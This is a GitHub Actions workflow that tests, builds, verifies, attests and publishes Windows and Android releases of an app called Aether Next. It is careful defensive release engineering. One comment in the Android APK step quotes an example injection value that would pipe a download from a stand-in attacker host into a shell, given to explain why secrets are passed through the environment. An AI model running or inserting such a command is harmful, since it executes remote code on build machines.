# Builds development artifacts on main and distributable apps on witnessed tags.
# Development downloads stay in Actions artifacts; only tag builds publish a Release.
name: Build apps

on:
  push:
    branches: [main]
    tags: ["v*"]
  workflow_dispatch:

# One build per branch/tag. A new push cancels the older in-flight job (not a real failure).
concurrency:
  group: build-apps-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read

env:
  CARGO_TERM_COLOR: always
  CMAKE_GENERATOR: Ninja

jobs:
  # One job per suite, fanned out. These used to be five sequential steps of a
  # single job, so the first failure — usually a Rust compile error — meant the
  # desktop and Android suites never ran at all: one red check masked four suites
  # with no signal, which is how three syntax errors sat on main across two
  # pushes. Each suite now reports for itself.
  test-engine:
    name: Test engine
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: dtolnay/rust-toolchain@02cb101ec7c40f2c49e1d9714d64511d8e1b74de # master
        with:
          toolchain: "1.88.0"
      - uses: lukka/get-cmake@5f6e04f5267c8133f1273bf2103583fc72c46b17 # v3.31.5
      - uses: ilammy/setup-nasm@72793074d3c8cdda771dba85f6deafe00623038b # v1.5.2
      - name: Run engine tests
        working-directory: aether
        # --release avoids debug CRT mismatch with BoringSSL on VS 18 2026 runners.
        run: cargo test --release --features test-hooks
        env:
          CMAKE_GENERATOR: Ninja

  test-desktop-backend:
    name: Test desktop backend
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: dtolnay/rust-toolchain@02cb101ec7c40f2c49e1d9714d64511d8e1b74de # master
        with:
          toolchain: "1.88.0"
      - uses: lukka/get-cmake@5f6e04f5267c8133f1273bf2103583fc72c46b17 # v3.31.5
      - uses: ilammy/setup-nasm@72793074d3c8cdda771dba85f6deafe00623038b # v1.5.2
      - name: Run desktop backend tests
        working-directory: apps/desktop/src-tauri
        run: cargo test --tests
        env:
          CMAKE_GENERATOR: Ninja

  test-desktop-ui:
    name: Test desktop frontend
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a # v4.2.0
        with:
          node-version: "22"
          cache: npm
          cache-dependency-path: apps/desktop/package-lock.json
      - name: Run desktop frontend tests
        working-directory: apps/desktop
        run: |
          npm ci
          npm test

  test-android-ui:
    name: Test android frontend
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a # v4.2.0
        with:
          node-version: "22"
          cache: npm
          cache-dependency-path: apps/android/package-lock.json
      - name: Run android frontend tests
        working-directory: apps/android
        run: |
          npm ci
          npm test

  test-android-native:
    name: Test android native
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-java@3a4f6e1af504cf6a31855fa899c6aa5355ba6c12 # v4.7.0
        with:
          distribution: "temurin"
          java-version: "21"
      - name: Run android unit tests
        working-directory: apps/android/android
        run: ./gradlew testDebugUnitTest

  # Aggregator so the downstream jobs keep a single dependency and the check name
  # stays the one branch protection already refers to.
  test:
    name: Automated test gate
    needs:
      - test-engine
      - test-desktop-backend
      - test-desktop-ui
      - test-android-ui
      - test-android-native
    runs-on: ubuntu-latest
    steps:
      - run: echo "all five suites reported independently"

  # The release pipeline's own checks: the checksum step, the packaging policy,
  # the anchor writers, and the static gates over both workflows. These are cheap
  # and they run before `publish` can be reached, because every one of them exists
  # to catch something that a release run would otherwise only discover after the
  # artifacts are downloadable.
  #
  # Why a job of its own rather than more steps in the build jobs: a build job that
  # has already spent forty minutes compiling cannot tell you whether the step that
  # packs its output is correct, and the answer to that question fits in seconds.
  release-integrity:
    name: Release integrity gates
    needs: [test]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a # v4.2.0
        with:
          node-version: "22"
      - name: Checksum step, against a fixture release directory
        run: |
          set -euo pipefail
          bash .github/scripts/test-pack-checksums.sh
          bash .github/scripts/test-pack-checksums.sh --selftest-fail
      - name: Packaging policy and anchor writers
        run: |
          set -euo pipefail
          node scripts/package-policy.mjs --selftest-fail
          node scripts/anchor-witness.mjs --selftest-fail
          # The committed anchor must stay readable by the two writers that touch
          # it, each of which finds an entry with the same no-braces locator.
          node scripts/publish-engine-trust.mjs --check --name wintun.dll --file packaging/wintun.dll
      - name: Static gates over the workflows
        run: |
          set -euo pipefail
          node scripts/verify-release-integrity.mjs
          node scripts/verify-release-integrity.mjs --selftest-fail

  windows-app:
    name: Windows x64
    needs: [test, release-integrity]
    runs-on: windows-latest
    timeout-minutes: 60
    permissions:
      contents: read
      actions: read
      id-token: write
      attestations: write
    env:
      AETHER_PACKAGE_KIND: ${{ startsWith(github.ref, 'refs/tags/') && 'release' || 'development' }}
      AETHER_ALLOW_UNWITNESSED: ${{ startsWith(github.ref, 'refs/tags/') && '' || '1' }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: dtolnay/rust-toolchain@02cb101ec7c40f2c49e1d9714d64511d8e1b74de # master
        with:
          toolchain: "1.88.0"
      - uses: actions/setup-go@f111f3307d8850f501ac008e886eec1fd1932a34 # v5.3.0
        with:
          go-version: "1.22"
          cache: false
      - uses: lukka/get-cmake@5f6e04f5267c8133f1273bf2103583fc72c46b17 # v3.31.5
      - uses: ilammy/setup-nasm@72793074d3c8cdda771dba85f6deafe00623038b # v1.5.2
      - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a # v4.2.0
        with:
          node-version: "22"
          cache: npm
          cache-dependency-path: apps/desktop/package-lock.json
      - name: Decide what this run may ship
        id: policy
        run: node scripts/package-policy.mjs --check
      - name: Read engine witness pointer
        id: witness
        if: env.AETHER_PACKAGE_KIND == 'release' || steps.policy.outputs.anchor_complete == 'true'
        shell: pwsh
        run: |
          $doc = Get-Content -Raw packaging/trust/engine-trust.json | ConvertFrom-Json
          $engine = $doc.files | Where-Object { $_.name -eq 'aether.exe' } | Select-Object -First 1
          if ($engine.signing_profile -ne 'unsigned-witnessed') { throw 'engine has no reviewed unsigned witness' }
          "run=$($engine.witnessed_run)" | Out-File $env:GITHUB_OUTPUT -Encoding utf8 -Append
          "artifact=$($engine.witnessed_artifact)" | Out-File $env:GITHUB_OUTPUT -Encoding utf8 -Append
      - name: Download witnessed engine
        if: env.AETHER_PACKAGE_KIND == 'release' || steps.policy.outputs.anchor_complete == 'true'
        uses: actions/download-artifact@cc203385981b70ca67e1cc392babf9cc229d5806 # v4.1.9
        with:
          name: ${{ steps.witness.outputs.artifact }}
          run-id: ${{ steps.witness.outputs.run }}
          path: witnessed-engine
          github-token: ${{ secrets.GITHUB_TOKEN }}
      - name: Build development engine
        if: env.AETHER_PACKAGE_KIND != 'release' && steps.policy.outputs.anchor_complete != 'true'
        working-directory: aether
        run: cargo build --release
      - name: Stage and verify native files
        shell: pwsh
        run: |
          $resources = 'apps/desktop/src-tauri/resources'
          New-Item -ItemType Directory -Force -Path $resources | Out-Null
          $engine = if (Test-Path 'witnessed-engine/aether.exe') { 'witnessed-engine/aether.exe' } else { 'aether/target/release/aether.exe' }
          if (-not (Test-Path -LiteralPath $engine -PathType Leaf)) { throw 'engine is missing' }
          Copy-Item -Force $engine "$resources/aether.exe"
          Copy-Item -Force 'packaging/wintun.dll' "$resources/wintun.dll"
          node scripts/publish-engine-trust.mjs --check --name wintun.dll --file "$resources/wintun.dll"
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          node scripts/publish-engine-trust.mjs --check --name aether.exe --file "$resources/aether.exe"
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
      - name: Build app
        working-directory: apps/desktop
        shell: pwsh
        run: |
          npm ci
          npm run build
          npm run tauri build
      - name: Package
        shell: pwsh
        run: |
          node scripts/package-policy.mjs --check
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          $label = "${{ steps.policy.outputs.artifact_label }}"
          $out = 'dist-windows'
          New-Item -ItemType Directory -Force -Path $out, "$out/portable/engine" | Out-Null
          $nsis = Get-ChildItem 'apps/desktop/src-tauri/target/release/bundle/nsis' -Filter '*setup.exe' |
            Sort-Object LastWriteTime -Descending | Select-Object -First 1
          if (-not $nsis) { throw 'installer missing' }
          $gui = @(
            'apps/desktop/src-tauri/target/release/Aether Next.exe',
            'apps/desktop/src-tauri/target/release/aether-desktop.exe',
            'apps/desktop/src-tauri/target/release/Aether.exe'
          ) | Where-Object { Test-Path $_ } | Select-Object -First 1
          if (-not $gui) { throw 'desktop executable missing' }
          Copy-Item $nsis.FullName "$out/AetherNext$label-windows-x64-setup.exe"
          Copy-Item $gui "$out/portable/AetherNext$label-Desktop.exe"
          Copy-Item 'apps/desktop/src-tauri/resources/aether.exe' "$out/portable/engine/aether.exe"
          Copy-Item 'packaging/wintun.dll' "$out/portable/wintun.dll"
          Copy-Item 'packaging/wintun.dll' "$out/portable/engine/wintun.dll"
          Copy-Item 'packaging/trust/engine-trust.json' "$out/portable/engine-trust.json"
          Copy-Item 'packaging/trust/engine-trust.json' "$out/engine-trust.json"
          @(
            'Aether Next for Windows is unsigned; Windows may display Unknown publisher.',
            'Verify the SHA-256 checksum and GitHub build attestation before running.',
            "Run AetherNext$label-Desktop.exe"
          ) | Set-Content "$out/portable/README.txt"
          if ($label -eq '-dev') {
            'DEVELOPMENT BUILD: not a release; the engine may lack a published witness.' |
              Add-Content "$out/portable/README.txt"
          }
          Compress-Archive -Path "$out/portable/*" -DestinationPath "$out/AetherNext$label-portable-windows-x64.zip" -Force
      - name: Verify packaged payloads
        shell: pwsh
        run: |
          $label = "${{ steps.policy.outputs.artifact_label }}"
          $verify = @{
            Installer = "dist-windows/AetherNext$label-windows-x64-setup.exe"
            Portable = "dist-windows/AetherNext$label-portable-windows-x64.zip"
            Anchor = 'packaging/trust/engine-trust.json'
          }
          if ($label -eq '-dev') {
            $verify.Development = $true
            if ('${{ steps.policy.outputs.anchor_complete }}' -ne 'true') {
              $verify.DevEngineSha256 = (Get-FileHash 'apps/desktop/src-tauri/resources/aether.exe' -Algorithm SHA256).Hash.ToLowerInvariant()
            }
          }
          & './scripts/verify-installers.ps1' @verify
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          node scripts/publish-engine-trust.mjs --check --name aether.exe --file dist-windows/portable/engine/aether.exe
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          node scripts/publish-engine-trust.mjs --check --name wintun.dll --file dist-windows/portable/engine/wintun.dll
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
      - name: Attest Windows build provenance
        uses: actions/attest-build-provenance@e8998f949152b193b063cb0ec769d69d929409be # v2.4.0
        with:
          subject-path: |
            dist-windows/AetherNext*-windows-x64-setup.exe
            dist-windows/AetherNext*-portable-windows-x64.zip
      - uses: actions/upload-artifact@4cec3d8aa04e39d1a68397de0c4cd6fb9dce8ec1 # v4.6.1
        with:
          name: windows
          path: |
            dist-windows/AetherNext*-windows-x64-setup.exe
            dist-windows/AetherNext*-portable-windows-x64.zip
            dist-windows/engine-trust.json
          if-no-files-found: error

  android-apk:
    name: Android APKs
    needs: [test]
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
      attestations: write
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: dtolnay/rust-toolchain@02cb101ec7c40f2c49e1d9714d64511d8e1b74de # master
        with:
          toolchain: "1.88.0"
          targets: aarch64-linux-android,armv7-linux-androideabi,x86_64-linux-android
      - uses: actions/setup-go@f111f3307d8850f501ac008e886eec1fd1932a34 # v5.3.0
        with:
          go-version: "1.22"
          cache: false
      - uses: lukka/get-cmake@5f6e04f5267c8133f1273bf2103583fc72c46b17 # v3.31.5
      - uses: actions/setup-java@3a4f6e1af504cf6a31855fa899c6aa5355ba6c12 # v4.7.0
        with:
          distribution: temurin
          java-version: "21"
      - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a # v4.2.0
        with:
          node-version: "22"
          cache: npm
          cache-dependency-path: apps/android/package-lock.json
      - name: NDK
        id: ndk
        uses: nttld/setup-ndk@ed92fe6cadad69be94a966a7ee3271275e62f779 # v1.6.0
        with:
          ndk-version: r27d
          link-to-sdk: true
      - name: Accept Android licenses
        # `|| true` was there because `sdkmanager --licenses` exits non-zero even
        # when it succeeded. Tolerating the exit code is fine; tolerating the
        # absence of its *effect* is not - a failed acceptance would fall through
        # to the Gradle build, which then either prompts forever or fails with an
        # error that points at the NDK, not at the licence. Assert the outcome.
        run: |
          set -uo pipefail
          yes | sdkmanager --licenses >/dev/null 2>&1 || true
          test -d "$ANDROID_HOME/licenses" || { echo "::error::sdkmanager created no licenses directory under $ANDROID_HOME"; exit 1; }
          find "$ANDROID_HOME/licenses" -type f -size +0c | grep -q . || { echo "::error::$ANDROID_HOME/licenses holds no accepted term - the SDK licences were not agreed"; exit 1; }
          echo "Android SDK licences accepted ($(find "$ANDROID_HOME/licenses" -type f -size +0c | wc -l) file(s))"
      - run: cargo install cargo-ndk --version 4.1.2 --locked
      - name: Engine + stage
        working-directory: aether
        env:
          ANDROID_NDK_HOME: ${{ steps.ndk.outputs.ndk-path }}
          ANDROID_NDK_ROOT: ${{ steps.ndk.outputs.ndk-path }}
          CMAKE_GENERATOR: Ninja
          # Android 15 devices can run on 16 KB memory pages, and Play enforces it
          # for apps targeting 35+ from 2027-02-01. The linker only aligns PT_LOAD
          # to what it is asked for, so without this the engine .so lands at 0x1000
          # and fails to load on a 16 KB device — which the align check below would
          # catch, but only after a build that cannot ship.
          RUSTFLAGS: "-C link-arg=-Wl,-z,max-page-size=16384 -C link-arg=-Wl,-z,common-page-size=16384"
        run: |
          set -euo pipefail
          for abi in arm64-v8a armeabi-v7a x86_64; do
            cargo ndk -t "$abi" --platform 26 build --release
          done
          mkdir -p ../apps/android/android/app/src/main/jniLibs/{arm64-v8a,armeabi-v7a,x86_64}
          mkdir -p ../apps/android/android/app/src/main/assets/engine
          cp target/aarch64-linux-android/release/aether ../apps/android/android/app/src/main/jniLibs/arm64-v8a/libaether.so
          cp target/armv7-linux-androideabi/release/aether ../apps/android/android/app/src/main/jniLibs/armeabi-v7a/libaether.so
          cp target/x86_64-linux-android/release/aether ../apps/android/android/app/src/main/jniLibs/x86_64/libaether.so
          for so in ../apps/android/android/app/src/main/jniLibs/*/libaether.so; do
            node ../scripts/verify-hev-lock.mjs --align "$so"
          done
          cp target/aarch64-linux-android/release/aether ../apps/android/android/app/src/main/assets/engine/aether
      - name: UI
        working-directory: apps/android
        run: |
          npm ci
          npm run sync-www
      - name: Verify staged native payloads
        working-directory: apps/android/android
        run: |
          set -euo pipefail
          for abi in arm64-v8a armeabi-v7a x86_64; do
            for lib in libaether.so libhev-socks5-tunnel.so; do
              f="app/src/main/jniLibs/$abi/$lib"
              test -s "$f"
              echo "ok $f $(stat -c%s "$f" 2>/dev/null || wc -c < "$f")"
            done
          done
          # `test -s` above only proves non-empty. The staged hev payload is what
          # actually terminates the user's tunnel inside the VpnService fd, so it
          # is checked against a recorded digest and its ELF page alignment.
          node ../../../scripts/verify-hev-lock.mjs
          node ../../../scripts/verify-hev-lock.mjs --selftest-fail
      - name: APKs
        working-directory: apps/android/android
        env:
          AETHER_ANDROID_KEYSTORE: ${{ github.workspace }}/apps/android/android/release.keystore
          AETHER_ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
          AETHER_ANDROID_KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
          AETHER_ANDROID_KEY_PASSWORD: ${{ secrets.ANDROID_KEY_PASSWORD }}
          # Secrets and action outputs reach the shell only through the
          # environment. Interpolating them into `run:` pastes untrusted text
          # straight into the script, so a keystore value containing `"; curl
          # attacker.tld | sh; #` becomes code, and the literal also shows up in
          # the step's rendered command before it executes.
          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
          NDK_PATH: ${{ steps.ndk.outputs.ndk-path }}
        run: |
          test -n "$KEYSTORE_BASE64" || { echo "ANDROID_KEYSTORE_BASE64 secret missing"; exit 1; }
          printf '%s' "$KEYSTORE_BASE64" | base64 --decode > release.keystore
          echo "sdk.dir=$ANDROID_HOME" > local.properties
          echo "ndk.dir=$NDK_PATH" >> local.properties
          chmod +x ./gradlew
          ./gradlew assembleRelease --stacktrace
          ls -la app/build/outputs/apk/release/
      - name: Verify APK signature
        working-directory: apps/android/android
        run: |
          set -euo pipefail
          WANT="1396DD16D8F2954E7D9A213AD0BF2BA8B96E4A5B5F0A71C3CA88A133744794AC"
          APKSIGNER=$(find "$ANDROID_HOME/build-tools" -name apksigner -type f | sort -V | tail -1)
          test -n "$APKSIGNER"
          for apk in app/build/outputs/apk/release/*.apk; do
            echo "=== verify $apk ==="
            out=$("$APKSIGNER" verify --verbose --print-certs "$apk" 2>&1) || {
              echo "$out"
              exit 1
            }
            echo "$out"
            # apksigner formats vary: "Signer #1 certificate SHA-256 digest:" or "V2 Signer: certificate SHA-256 digest:"
            digest=$(printf '%s\n' "$out" | grep -iE 'certificate SHA-256 digest:' | head -1 | sed -E 's/.*SHA-256 digest:[[:space:]]*//' | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')
            echo "signer digest=$digest"
            test -n "$digest"
            test "$digest" = "$WANT"
          done
      - name: Collect
        run: |
          set -euo pipefail
          mkdir -p dist-android
          rel=apps/android/android/app/build/outputs/apk/release
          cp "$rel"/app-arm64-v8a-release.apk    dist-android/AetherNext-android-arm64-v8a.apk
          cp "$rel"/app-armeabi-v7a-release.apk  dist-android/AetherNext-android-armeabi-v7a.apk
          cp "$rel"/app-x86_64-release.apk       dist-android/AetherNext-android-x86_64.apk
          cp "$rel"/app-universal-release.apk    dist-android/AetherNext-android-universal.apk
          ls -la dist-android/
      - name: Attest Android build provenance
        uses: actions/attest-build-provenance@e8998f949152b193b063cb0ec769d69d929409be # v2.4.0
        with:
          subject-path: dist-android/*.apk
      - uses: actions/upload-artifact@4cec3d8aa04e39d1a68397de0c4cd6fb9dce8ec1 # v4.6.1
        with:
          name: android
          path: dist-android/*.apk
          if-no-files-found: error

  # Only tag builds with a reviewed engine digest become public releases.
  publish:
    name: Publish downloads
    needs: [test, windows-app, android-apk]
    if: ${{ always() && startsWith(github.ref, 'refs/tags/') && needs.test.result == 'success' && needs.windows-app.result == 'success' && needs.android-apk.result == 'success' }}
    runs-on: ubuntu-latest
    # Configure required reviewers for this environment in repository settings.
    environment: release
    permissions:
      contents: write
    env:
      AETHER_PACKAGE_KIND: ${{ startsWith(github.ref, 'refs/tags/') && 'release' || 'development' }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/download-artifact@cc203385981b70ca67e1cc392babf9cc229d5806 # v4.1.9
        with:
          path: dist
          merge-multiple: true
      # Judged on the anchor that ships *inside* the artifacts, not on a job
      # output: the file a user finds next to the binaries is the file that has to
      # be able to vouch for them. A tag fails here; a development run reports
      # publishable=false and the release steps below are skipped.
      - name: Ask whether this run may publish
        id: eligible
        run: |
          set -euo pipefail
          node scripts/package-policy.mjs --check --anchor dist/engine-trust.json
      # The payload flatten, the checksums and the manifest checks live in
      # .github/scripts/pack-checksums.sh, not here. They used to be inline, and an
      # inline shell body in YAML is code nobody can run before it ships: the step
      # wrote one sidecar per payload and then built the manifest by globbing the
      # directory - which took the sidecars with it - so the manifest held 2N lines
      # against the count of N the next line demanded. Publish could not pass, on
      # any ref, and only a release run could reveal it.
      # `bash .github/scripts/test-pack-checksums.sh` runs this step's logic against
      # a fixture release directory and asserts the manifest lists every payload
      # exactly once, that every sidecar verifies, and that a manifest missing a
      # payload fails the step instead of publishing.
      - name: Pack + checksums
        id: pack
        run: |
          set -euo pipefail
          bash .github/scripts/pack-checksums.sh --src dist --out out
      - name: Development artifacts, nothing published
        if: steps.eligible.outputs.publishable != 'true'
        run: |
          {
            echo "## Not published: development artifacts"
            echo
            echo 'The engine in these files is not covered by a published trust anchor'
            echo 'and cannot be used as a release download.'
            echo 'They remain downloadable from this workflow run; they are not downloads'
            echo 'for end users. See packaging/trust/README.md and run the'
            echo '**Prepare engine anchor** workflow to change that.'
          } >> "$GITHUB_STEP_SUMMARY"
          echo "::notice::skipping the release upload: this run's package is not distributable"
      - name: Upload to GitHub Release
        if: steps.eligible.outputs.publishable == 'true'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAG: ${{ steps.pack.outputs.tag }}
          TITLE: ${{ steps.pack.outputs.title }}
          PRE: ${{ steps.pack.outputs.prerelease }}
        run: |
          set -euo pipefail
          NOTES="Windows installer + portable (unsigned), Android APKs (arm64 / armv7 / x86_64 / universal).

          Windows may show Unknown publisher. Verify the SHA-256 checksum and GitHub build attestation before running.

          Commit: ${GITHUB_SHA}
          Run: ${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}"

          # Create or update the release for this tag.
          if gh release view "$TAG" >/dev/null 2>&1; then
            gh release edit "$TAG" --title "$TITLE" --notes "$NOTES" --target "$GITHUB_SHA"
            if [ "$PRE" = "true" ]; then gh release edit "$TAG" --prerelease; else gh release edit "$TAG" --latest; fi
          else
            EXTRA=()
            if [ "$PRE" = "true" ]; then EXTRA+=(--prerelease); else EXTRA+=(--latest); fi
            gh release create "$TAG" --title "$TITLE" --notes "$NOTES" --target "$GITHUB_SHA" "${EXTRA[@]}"
          fi

          # Overwrite files with the same names
          gh release upload "$TAG" out/* --clobber
